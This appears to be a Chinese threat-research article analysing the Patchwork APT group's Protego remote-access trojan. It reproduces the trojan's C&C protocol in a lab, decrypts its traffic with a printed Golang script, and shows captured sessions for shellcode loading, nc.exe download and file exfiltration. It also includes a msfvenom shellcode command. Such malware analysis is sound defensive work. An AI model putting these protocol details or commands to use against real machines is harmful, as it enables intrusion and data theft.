#  Patchwork(白象)APT组织Protego远控木马攻击场景复现   
原创 T0daySeeker  T0daySeeker   2024-12-02 09:40  
  
```
文章首发地址：
https://xz.aliyun.com/t/16392
文章首发作者：
T0daySeeker

```  
## 概述  
  
在上一篇《最新Patchwork(白象)Protego远控木马接收某远控指令后将导致远控木马无法响应后续远控指令》文章中，笔者对Protego远控木马的功能进行了详细的介绍，对Protego远控木马的自定义加解密算法进行了详细的剖析。  
  
接下来，笔者准备按照以往的思路，从攻击场景复现、通信数据解密、通信模型剖析等多角度对Protego远控木马在通信过程中使用的各种技术进行详细剖析，更直观的理解Protego远控木马的实战应用场景。  
## 攻击场景复现  
  
为了能够更好的还原Protego远控木马的攻击利用场景，笔者尝试模拟构建了Protego远控木马的C&C端Demo程序，目前可有效的与Protego远控木马进行交互，相关运行效果如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9yO7VG6v5ChyEicdFficZ6t3WeEmYibpSBpU0sW3OsUVDF8AJKfe3Y6EZENaNbFMdySJZK29270pfHvw/640?wx_fmt=png&from=appmsg "")  
### inmem指令_远程加载执行shellcode  
  
Protego远控木马除了支持常见的远控指令外，还支持远程加载执行shellcode等功能，通过测试，笔者目前可有效复现其远程加载执行shellcode的功能行为。  
  
当Protego远控木马接收到inmem指令后，Protego远控木马将外联下载并执行shellcode，测试环境中，笔者使用的shellcode功能为反弹cmd，相关运行效果如下：  
  
**「备注：使用msfvenom -a x86 -p windows/exec CMD="cmd" EXITFUNC=thread -f hex命令即可生成反弹cmd的shellcode载荷。」**  
  
控制端截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9yO7VG6v5ChyEicdFficZ6t3WOJ5SxEIXqaTrAfyZZrU8ibOxPiaSxibW6Jbgrm6FcfNiapXYrxHia4nAw2Q/640?wx_fmt=png&from=appmsg "")  
  
被控端截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9yO7VG6v5ChyEicdFficZ6t3WvibTs4riaC4bF4ZuerGQuL6RXcEE5GNbQiaEZwZg1c2tbdOkafcnyl3hA/640?wx_fmt=png&from=appmsg "")  
### download指令_从被控端下载指定文件  
  
Protego远控木马还支持从被控端下载指定文件，相关运行效果如下：  
  
控制端截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9yO7VG6v5ChyEicdFficZ6t3Wn0Dia8ZwJ37afJZUGRT1n1EfALSb9QzAM3PiaDTxI2diazuWr9l0R9Qhw/640?wx_fmt=png&from=appmsg "")  
  
被控端截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9yO7VG6v5ChyEicdFficZ6t3WSf48JtI6icc30dxzN3B21IANC0MwKe5reSwojZOz34mTKPfhuu1M5Eg/640?wx_fmt=png&from=appmsg "")  
## 通信数据解密  
  
由于远控木马默认使用的通信方式是TLS，因此，若想在测试环境中查看其通信数据，除将木马修改为HTTP通信外，只有尝试对其通信数据进行TLS解密。  
  
为避免修改其通信方式后，木马的执行逻辑会有所不同，最好的方式即为完整复现其实战场景中会使用的通信模式。  
### TLS解密  
  
由于此远控木马是NET程序编写的，因此可采用笔者以前的《适用于不支持指定密钥套件的NET程序的TLS解密方法》（访问地址：https://xz.aliyun.com/t/13715）文章中提到的方法，向远控木马指定在TLS通信过程中将使用的密码套件，指定密码套件为：TLS_RSA_WITH_AES_128_CBC_SHA256，相关截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9yO7VG6v5ChyEicdFficZ6t3WLGOmDdibiaus6uwvxtnvGEAicQHAVibq74zrBzsXSG5ANrcLAsQMK0wFVA/640?wx_fmt=png&from=appmsg "")  
  
然后，我们即可使用私钥对远控木马通信进行解密了。  
  
**「备注：TLS解密的具体方法可参考笔者前期《Remcos RAT通信模型剖析及攻防技术对抗》（访问地址：https://xz.aliyun.com/t/13206）文章中【通信解密尝试】章节的内容。」**  
  
TLS通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9yO7VG6v5ChyEicdFficZ6t3W8G4Lh5Le9fibfOAPb72iaPT2yhJlgyWoylMUkBhf5fHicxKDZickoA2Wcw/640?wx_fmt=png&from=appmsg "")  
  
使用私钥解密TLS通信后的数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9yO7VG6v5ChyEicdFficZ6t3WaQDIeKSAEmmdzJ6x32EPHicrebd5X7y9J6Ib4YO4RuU0z8x0wcH5sjg/640?wx_fmt=png&from=appmsg "")  
### 自定义算法解密  
  
在解密第一层TLS通信数据后，我们即可看到远控木马的实际通信数据，但由于此木马在通信过程中使用了自定义加解密算法，因此，我们可尝试编写解密脚本，对其第二层自定义加密数据进行解密。  
  
在这里，笔者尝试使用Golang语言编写了一个解密Protego远控木马第二层自定义加密数据的解密脚本，相关解密效果如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9yO7VG6v5ChyEicdFficZ6t3WSvjfyOcuibCM9RjSCkTYZ6noUONP3eziclgoOgxGvN3bmlAvedqo4UOA/640?wx_fmt=png&from=appmsg "")  
  
解密脚本代码如下：  
```
package main

import (
 "encoding/base64"
 "fmt"
 "os"
)

func main() {
 args := os.Args

 if len(args) > 1 {
  fmt.Println("待解密数据：", args[1])
  fmt.Println("解密后数据：", Decode(args[1]))
 } else {
  fmt.Println("没有提供命令行参数")
 }
}

func Base64_Decode(encodedMessage string) []byte {
 decodedMessage, err := base64.StdEncoding.DecodeString(encodedMessage)
 if err != nil {
  //fmt.Println("Base64_Decode Error:", err)
  return nil
 }
 return decodedMessage
}

func Charm(qwe string) []byte {
 a1 := Base64_Decode(qwe)
 //a2 := FerulaE([]byte("+_I-I3 |<||\\|9 |5 |3/-\\c|<"), a1)

 a2 := FerulaE([]byte{0x2B, 0x5F, 0x49, 0x2D, 0x49, 0x33, 0x20, 0x7C, 0x3C, 0x7C, 0x7C, 0x5C, 0x7C, 0x39, 0x20, 0x7C, 0x35, 0x20, 0x7C, 0x33, 0x2F, 0x2D, 0x5C, 0x63, 0x7C, 0x3C}, a1)
 a3 := Revelio(a2)
 return a3
}

func Decode(input string) string {
 encodedString := Charm(input)
 text := Base64_Decode(string(encodedString))
 return string(text)
}

func Geminio(hel []byte) []byte {
 array := make([]byte, len(hel))
 for i := 0; i < len(hel); i++ {
  j := int(hel[i])
  num := 2
  for j > 1 {
   if j%num == 0 {
    for j%num == 0 {
     j /= num
    }
   }
   num++
  }
  array[i] = byte(num - 1)
 }
 return array
}

func Revelio(chel []byte) []byte {
 chars := []rune{'0', '|', '\\', '|', '3', ' ', '|', '>', '|', '3', 'c', '3'}
 array := Geminio([]byte(string(chars)))
 array2 := make([]byte, len(chel))
 array3 := make([]byte, len(array))
 copy(array3, array)

 // Sort array3 in descending order
 for i := 0; i < len(array3); i++ {
  for j := i + 1; j < len(array3); j++ {
   if array3[i] < array3[j] {
    array3[i], array3[j] = array3[j], array3[i]
   }
  }
 }

 for i := 0; i < len(array); i++ {
  for j := 0; j < len(chel); j++ {
   var num int
   if i == 0 {
    num = int(chel[j]) - int(array[i]) - int(array3[i])
   } else {
    num = int(array2[j]) - int(array[i]) - int(array3[i])
   }
   if num < 0 {
    num += 255
   }
   if num < 0 {
    num += 255
   }
   array2[j] = byte(num)
  }
 }
 return array2
}

func FerulaE(pwd []byte, data []byte) []byte {
 var array [256]int
 var array2 [256]int
 array3 := make([]byte, len(data))

 for i := 0; i < 256; i++ {
  array[i] = int(pwd[i%len(pwd)])
  array2[i] = i
 }

 num := 0
 for i := 0; i < 256; i++ {
  num = (num + array2[i] + array[i]) % 256
  array2[i], array2[num] = array2[num], array2[i]
 }

 num3 := 0
 num = 0
 for i := 0; i < len(data); i++ {
  num3 = (num3 + 1) % 256
  num += array2[num3]
  num = num % 256
  array2[num3], array2[num] = array2[num], array2[num3]
  num4 := array2[(array2[num3]+array2[num])%256]
  array3[i] = data[i] ^ byte(num4)
 }

 return array3
}

```  
## 通信模型剖析  
  
通过梳理，根据通信请求载荷中的键值名的不同，笔者将此远控木马的通信模型分为以下几种不同的情况：  
- 木马上线：携带sosid、aryyr、slid键值，其中aryyr=bhiii为固定值  
  
- 上传主机信息：携带sosid、slid、sys、madd、sls、cwd、prsid、rt、pubip键值  
  
- 上传主机应用信息：携带sosid、slid、aunty、uncle键值  
  
- 心跳包，获取远控指令：携带sltrg键值  
  
- 响应远控指令通信：  
  
- 下载成功后的响应结果含有固定键值：aam=ackk  
  
- 响应结果含有固定键值：cate=dsagvsa  
  
- 直接返回指令执行结果：ping、pwd、whoami、dir、ipconfig、cat、ps等指令  
  
- 指定C&C其他URL：inmem指令  
  
- 指定第三方URL：downexe指令、upload指令  
  
- 下载文件：download、screenshot  
  
详细通信模式情况如下：  
### 木马上线  
- 上线请求  
  
```
POST /bIHTfcVHegEoMrv/WCcod7JY3zwUpDH.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: jiansmst.info
Content-Length: 136
Expect: 100-continue
Connection: Keep-Alive

sosid=HGZ8I4y9haqiOEvxDCSXyddMlrnfJwO27TDEOg==&aryyr=bhiii&slid=Z3FzXIup78/ZS1H1dgaQl9d/yOqjJnyOmk3cdXHEQi6dflH4YxJEDRzeZb5bV5UaIRjtOg==

#sosid解密后为：N1t5XaPk1MwK25HfFjq
#aryyr=bhiii，固定值
#slid解密后为：9D0B4D56-7933-3632-1348-7A674694302F

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Thu, 07 Nov 2024 00:46:16 GMT
Content-Length: 12

BC4XEhUOGTI=

#BC4XEhUOGTI=数据解密后为aaaaaaaa，随意填写的数据，此数据将用做后续异或算法密钥，但样本中未使用此密钥

```  
### 上传主机信息  
- 上传主机基本信息：系统版本、主机名、用户名、木马路径、木马进程PID、是否管理员权限、IP地址等  
  
```
POST /bIHTfcVHegEoMrv/WCcod7JY3zwUpDH.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: jiansmst.info
Content-Length: 387
Expect: 100-continue

sosid=HGZ8I4y9haqiOEvxDCSXyddMlrnfJwO27TDEOg==&slid=Z3FzXIup78/ZS1H1dgaQl9d/yOqjJnyOmk3cdXHEQi6dflH4YxJEDRzeZb5bV5UaIRjtOg==&sys=Hi4WXvDM9OGsbjnxdU/pw6BA6tTWKmuO70nXSw==&madd=YgEMf4ni78KiJAm7dSD1ztNNt6w=&sls=YgEMf4ni78KiJAm7dSD1ztNNt6zdQ3e87E61cg==&cwd=YVYScPS766asUS7aCSP5kaNZ9cOnQweN7xLTcQTGdXPoO0X6HzcpcR/HGvgkWooA&prsid=ZlZzWYys+Nc=&rt=Yml8YPnhkNc=&pubip=aQB/Ho+q8ZrZXUf0djb6kNcnyKU=

#sosid解密后为：N1t5XaPk1MwK25HfFjq
#slid解密后为：9D0B4D56-7933-3632-1348-7A674694302F  
#sys解密后为：Windows 10 Enterprise
#madd解密后为：DESKTOP-A11RBL8
#sls解密后为：DESKTOP-A11RBL8\admin
#cwd解密后为：C:\Users\admin\Desktop\Protego.exe
#prsid解密后为：7436
#rt解密后为：False
#pubip解密后为：192.168.64.1

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Thu, 07 Nov 2024 00:46:23 GMT
Content-Length: 0

```  
### 上传主机应用信息  
- 上传系统防病毒软件、系统所有已安装程序等信息  
  
```
POST /bIHTfcVHegEoMrv/WCcod7JY3zwUpDH.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: jiansmst.info
Content-Length: 1302
Expect: 100-continue

sosid=HGZ8I4y9haqiOEvxDCSXyddMlrnfJwO27TDEOg==&slid=Z3FzXIup78/ZS1H1dgaQl9d/yOqjJnyOmk3cdXHEQi6dflH4YxJEDRzeZb5bV5UaIRjtOg==&aunty=Hi4WXvDM9OGsbjqkCiOBqaBD6tTWI1nc&uncle=HQQWI/vM9J/WOy30dSD2kNd/+r7IQwe98knTRw6tdRboB029YyJEc2LHAMRVWr8eVQOYDwFVD0tAmXGhaDQHvXRW/izAoLMAOL6rTI1VynJ0qTZrpocyjC/vDkjISs+MWjy6terbe0lphjeuxiaUZuX4C6mboN7pL7Q58EwAUozhOoMbclOcg19tpv2fmZ/UOC6qCYE98oN0ic2qIOa/awkw4Mx+VrVw9j8p6HyiiDVtMEeypRM/yOL6QM7et7LwVj06aCg7R6KAJ2W8siNJMiBSnQHpmn84kLvwYQ3akBTmoVYZ7rKV3eXCYJ37iFAyxFKgEJmcPm7AzuISYDFxK+FoddP3fVxI+yxyO13jXKZ1x7xJzZkQS30wIjApKiwoeuas7ga6+Nwm++Asf8R8flwHMECngtNT02p40ZxY1hEBHrLvDKClvXNSPuhiazkbCtXhwgyPJgHxy34V1ztWptUudVIzQ5WXmoyK+8mabHP7JoJJpOthBSqJdQR8noQ+lmQHST5V9EPwk/vtTu4SmoCH6CCsBxqDzNn/vEA0ZMqZGr4n2cEfcZmpPri9qPQz5+g83l/WuFS8xz0j2WhnHnL4aC5BNYx/q4kmZ2ID53VcTUb+3U3OtzC8oI8deYwgGo2+uL83TccXp2bS4upaSInB9bHUIYvzSNh2uJ535xlK5284lZ9s8QpQkAitG1nBgQP07HrHN0bT3FXCiE9LMUhUj9bnAUMAN2UWTuQHzuspVPFoOuX2LKYKSbhYzQ4UIUxgSi4Rpxd1olLhL5bfBc4yy3JJR+dH3uGJ9FiJSWudVAiGrSTInyw/l+UdfhXGc4gJ3bSaD/OemWAxrW96IxeuctkTZrnoV5JHJhpb711I/Jnu/SH85l0+cJr/0PpZk/jJ4xURRRI92sjz20K805S/Mi/EECgpcj6vanjcIsfXFT8rZAPMnVIMA3onHq9o9BXE3dsc3TWJocKc+FfEwxBPI+QZiZqYJfskbIy3ggGFhcVkMzrA3PmUNH/+WJZH6k0x8wQEMOtPyWuV+8E54luOFBRA3RMXWFL+pGupjSZzKpHTldM4fLm4v3kif5vpfLIo/jwTSTdevHWB4ePUuq+T0hoR42w7XBSNhXqPdDI=

#sosid解密后为：N1t5XaPk1MwK25HfFjq
#slid解密后为：9D0B4D56-7933-3632-1348-7A674694302F  
#aunty解密后为：Windows Defender

#uncle解密后为：
#Python 3.11.3 Executables (64-bit)
#Python 3.11.3 Development Libraries (64-bit)
#Python 3.11.3 Core Interpreter (64-bit)
#Python 3.11.3 Standard Library (64-bit)
#Python 3.11.3 Test Suite (64-bit)
#Python 3.11.3 pip Bootstrap (64-bit)
#Python 3.11.3 Utility Scripts (64-bit)
#Python 3.11.3 Tcl/Tk Support (64-bit)
#Python 3.11.3 Documentation (64-bit)
#Python Launcher
#Microsoft Visual C++ 2022 X64 Additional Runtime - 14.36.32532
#VMware Tools
#Microsoft Visual C++ 2022 X86 Additional Runtime - 14.36.32532
#Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.36.32532
#Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.36.32532

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Thu, 07 Nov 2024 00:46:25 GMT
Content-Length: 0

```  
### 心跳请求_获取远控指令  
  
通过分析，发现系统会根据wTime配置信息循环发起心跳请求，用于获取远控指令，若成功获取远控指令，则将远控指令响应结果返回至C&C。  
  
通过对Protego远控木马的远控指令进行详细剖析，从通信模型上进行区分，发现Protego远控木马的远控指令通信模型主要分为三类：  
- 直接返回指令执行结果：ping、pwd、whoami、dir、ipconfig、cat、ps等指令  
  
- 响应结果含有固定字符串：cate=dsagvsa  
  
- 指定C&C其他URL：inmem指令  
  
- 指定第三方URL：downexe指令、upload指令  
  
- 下载成功后的响应结果含有固定字符串：aam=ackk  
  
- 下载文件：download、screenshot  
  
#### dir指令  
- 第一段数据：获取远控指令  
  
```
POST /bIHTfcVHegEoMrv/WCcod7JY3zwUpDH.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: jiansmst.info
Content-Length: 86
Expect: 100-continue

sltrg=Z3FzXIup78%2fZS1H1dgaQl9d%2fyOqjJnyOmk3cdXHEQi6dflH4YxJEDRzeZb5bV5UaIRjtOg%3d%3d

#sltrg解密后为：9D0B4D56-7933-3632-1348-7A674694302F，系统GUID值

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Thu, 07 Nov 2024 01:31:04 GMT
Content-Length: 8

GgMWWg==

#解密后为：dir

```  
- 第二段数据：返回命令执行结果  
  
```
POST /bIHTfcVHegEoMrv/WCcod7JY3zwUpDH.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: jiansmst.info
Content-Length: 737
Expect: 100-continue

sosid=Z3FzXIup78/ZS1H1dgaQl9d/yOqjJnyOmk3cdXHEQi6dflH4YxJEDRzeZb5bV5UaIRjtOg==&slrspn=YVYScPS766asUS7aCSP5kaNZ9cOnQweN7xLTcQTGdRnpOlqFCEtkcmHaZbgyeftILVH1KWMxEwgxmwqmFzAAugkA4krIp605Mrywd4wI6A9qmTYd1IU6x1GEGHK%2bM6rvVlSb652GD3B2tATAr02nG%2fuTO%2fqTscnRR9Et9zBmWrvlG4diZViPjz5goYeU8fPXOC6iN4pb7Y8AnKirIY7ZL3ETnOdxfcMj%2fkgi3Rmh82UUKE%2by2jJF0IL0Lp%2bj3OTXXwxWNCplFZODUE7ByVR%2bHVw5ugr07WcH5LWSPR2BgG6Q%2fFcSh%2fioppG%2bYJ33709IxgmweffURRDUz%2bEnEUUCUZ0YcdjpEVMTkEViQkLOaNh1jb9gyo4fAXBUIVJZfFVpApO3tmfy%2f5gy%2fZQedq9nQyJiP3esmNMuoGZavpJy7hECMrnBeKSqvg8MTe8UazlsH6WDwwePLXP9rGUc1jtR%2f6pNdSNAQZLt5IuKwd2GCR6aPfQJsOkLPyvCOH4K15sV7wYIeCxVjEaG6%2bTrKu9pveDk%2f2Cnb2W2va2MxjxEYMGHdrF8sqgPCIaECsa94vcanaBV3yHEu1zHsC4rsXIeJ3HBSk0%3d&cate=dsagvsa

#sosid解密后为：9D0B4D56-7933-3632-1348-7A674694302F  
#slrspn解密后为：
#C:\Users\admin\Desktop\dnSpy-net-win32
#C:\Users\admin\Desktop\IDA8.3
#C:\Users\admin\Desktop\111.txt
#C:\Users\admin\Desktop\apateDNS.exe
#C:\Users\admin\Desktop\dnSpy-net-win32.zip
#C:\Users\admin\Desktop\IDA SDK.zip
#C:\Users\admin\Desktop\Process Hacker 2.lnk
#C:\Users\admin\Desktop\Protego.exe
#C:\Users\admin\Desktop\Wireshark.lnk
#cate=dsagvsa，固定值

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Thu, 07 Nov 2024 01:31:04 GMT
Content-Length: 0

```  
#### inmem指令  
- 第一段会话：获取远控指令  
  
```
POST /bIHTfcVHegEoMrv/WCcod7JY3zwUpDH.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: jiansmst.info
Content-Length: 86
Expect: 100-continue

sltrg=Z3FzXIup78%2fZS1H1dgaQl9d%2fyOqjJnyOmk3cdXHEQi6dflH4YxJEDRzeZb5bV5UaIRjtOg%3d%3d

#sltrg解密后为：9D0B4D56-7933-3632-1348-7A674694302F，系统GUID值

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Tue, 05 Nov 2024 15:56:29 GMT
Content-Length: 32

EXNvX/C8za2nFC7OCiOjrqsE8dvfTWzC

#解密后为：inmem _shellcode

```  
- 第二段会话：外联下载shellcode  
  
```
GET /bIHTfcVHegEoMrv/WCcod7JY3zwUpDH.php_shellcode HTTP/1.1
Host: jiansmst.info


HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Tue, 05 Nov 2024 15:56:29 GMT
Content-Length: 344

RwsbEJvS/NOmPk7NdS/pprsH+e/MbXDS9xDYUh7rJBWXQTDRbyJNCHmuPIwwSpZ2IQ70L3xbHh5Vy37/E1RW43wGsCq60ZVhR8nYefw7vC1lw3gU3ukwqT+3b1GuaKrpOGrAkf/ICHEiiwa6jx2madGtCZiFp7a/RbBbtyZpVcL9FvNGd0OPmw0p1Z3g8tCJPUT3f9JIgOkbvMT3MP7aIAg/nLV6ILUh+l4X2g2PlBkBFE6NyjQM1Z+MbJ3H1624PSA6Clw9EaWReEjf5hc1MUElxg/4ggFB+tS3HmCz6GuH5EZp9+P0i73hD7uB40s3pn+hWMXARlLW0oIZBjJ1Gg==

#解密后载荷为：弹cmd的shellcode

```  
#### downexe指令  
- 第一段会话：获取远控指令  
  
```
POST /bIHTfcVHegEoMrv/WCcod7JY3zwUpDH.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: jiansmst.info
Content-Length: 86
Expect: 100-continue

sltrg=Z3FzXIup78%2fZS1H1dgaQl9d%2fyOqjJnyOmk3cdXHEQi6dflH4YxJEDRzeZb5bV5UaIRjtOg%3d%3d

#sltrg解密后为：9D0B4D56-7933-3632-1348-7A674694302F

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Tue, 05 Nov 2024 11:29:34 GMT
Content-Length: 64

GgNrIPimk96lNDrOHFT5ktVP8O6gMBKOmlvcDXDbMVCdTUCCYWpYRR/HGvgkWooA

#解密后数据为：downexe http://192.168.64.1/nc.exe

```  
- 第二段会话：外联下载  
  
```
GET /nc.exe HTTP/1.1
Host: 192.168.64.1
Connection: Keep-Alive


HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Tue, 05 Nov 2024 11:55:05 GMT
Transfer-Encoding: chunked

10c2cHHITApvS......加密数据......

```  
- 第三段会话：返回下载成功信息  
  
```
POST /bIHTfcVHegEoMrv/WCcod7JY3zwUpDH.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: jiansmst.info
Content-Length: 53
Expect: 100-continue

sam=HGZ8I4y9haqiOEvxDCSXyddMlrnfJwO27TDEOg==&aam=ackk

#sam解密后为：N1t5XaPk1MwK25HfFjq  （随机sosid值）
#aam=ackk，固定值

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Tue, 05 Nov 2024 11:55:05 GMT
Content-Length: 0

```  
#### download指令  
  
通过分析，梳理download指令的通信模型如下：**「（备注：screenshot指令的通信模型与download指令的通信模型相同）」**  
- 第一段会话：获取远控指令  
  
```
POST /bIHTfcVHegEoMrv/WCcod7JY3zwUpDH.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: jiansmst.info
Content-Length: 86
Expect: 100-continue

sltrg=Z3FzXIup78%2fZS1H1dgaQl9d%2fyOqjJnyOmk3cdXHEQi6dflH4YxJEDRzeZb5bV5UaIRjtOg%3d%3d

#sltrg解密后为：9D0B4D56-7933-3632-1348-7A674694302F

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Tue, 05 Nov 2024 15:10:23 GMT
Content-Length: 72

GgNrIPimtZymSCnGcQabvqxe7tTWKn+k507Tcwa3MAGZUSKAFGtHcWisO7xbJ5JIRAOUDw==

#解密后数据为：download C:\Users\admin\Desktop\111.txt

```  
- 第二段会话：下载指定文件  
  
```
POST /bIHTfcVHegEoMrv/WCcod7JY3zwUpDH.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: jiansmst.info
Content-Length: 2109
Expect: 100-continue

syst=khjop&sosid=Z3FzXIup78/ZS1H1dgaQl9d/yOqjJnyOmk3cdXHEQi6dflH4YxJEDRzeZb5bV5UaIRjtOg==&nmef=C:\Users\admin\AppData\Local\Temp\NxclA024MetxnnrYS8q_HGoaafjO4J3aXSqvCiT50aBD9enaMnzL7TDEOg%3d%3d_111.txt_2hhTYV9zF0mPriuUIxTuag.zip&dta=HQERD5j...加密数据...yNlYFECZvE=&ghack=0

#syst=khjop，固定值
#sosid值解密后为：9D0B4D56-7933-3632-1348-7A674694302F，系统GUID值
#nmef值为：%temp%目录 + sosid值 + '_' + 加密后的sosid值  + '_' + 原始文件名  + '_' + 编码后的GUID值 + '.zip'
#dta值为：压缩文件加密后的载荷内容
#ghack值，0为还未传输完

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Tue, 05 Nov 2024 15:10:23 GMT
Content-Length: 0

```  
- 下载完成标志  
  
```
POST /bIHTfcVHegEoMrv/WCcod7JY3zwUpDH.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: jiansmst.info
Content-Length: 245
Expect: 100-continue

syst=khjop&sosid=Z3FzXIup78/ZS1H1dgaQl9d/yOqjJnyOmk3cdXHEQi6dflH4YxJEDRzeZb5bV5UaIRjtOg==&nmef=C:\Users\admin\AppData\Local\Temp\NxclA024MetxnnrYS8q_HGoaafjO4J3aXSqvCiT50aBD9enaMnzL7TDEOg%3d%3d_111.txt_2hhTYV9zF0mPriuUIxTuag.zip&dta=none&ghack=1

#syst=khjop，固定值
#sosid值解密后为：9D0B4D56-7933-3632-1348-7A674694302F，系统GUID值
#nmef值为：%temp%目录 + sosid值 + '_' + 加密后的sosid值  + '_' + 原始文件名  + '_' + 编码后的GUID值 + '.zip'
#dta值，none为传输完成
#ghack值，1为传输完成

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Tue, 05 Nov 2024 15:10:23 GMT
Content-Length: 0

```  
  
  
  
